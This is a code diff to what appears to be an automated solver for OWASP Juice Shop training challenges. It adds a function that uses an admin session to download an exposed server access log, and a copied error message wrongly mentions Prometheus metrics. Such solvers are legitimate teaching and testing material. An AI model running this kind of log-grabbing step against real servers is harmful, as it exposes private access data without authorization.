@@ -54,6 +54,18 @@ def download_file_from_ftp(server, session, filename):
         raise RuntimeError('Error retrieving FTP files.')
     return fetch
 
+def download_access_log(server, session):
+    """
+    Gain access to any access log file of the server
+    :param server: juice shop URL
+    :param session: Requests session
+    :return: Response
+    """
+    tracking = '{}/support/logs/access.log.2023-11-20'.format(server)
+    admin = session.get(tracking)
+    if not admin.ok:
+        raise RuntimeError('Error accessing prometheus metrics.')
+
 
 def _write_file_to_disk(filename, response):
     """
@@ -94,4 +106,5 @@ def solve_file_handling_challenges(server):
     session = get_admin_session(server)
     download_files_from_ftp(server, session)
     solve_file_upload_challenges(server, session)
+    download_access_log(server, session)
     print('\n== FILE HANDLING CHALLENGES COMPLETE ==\n')
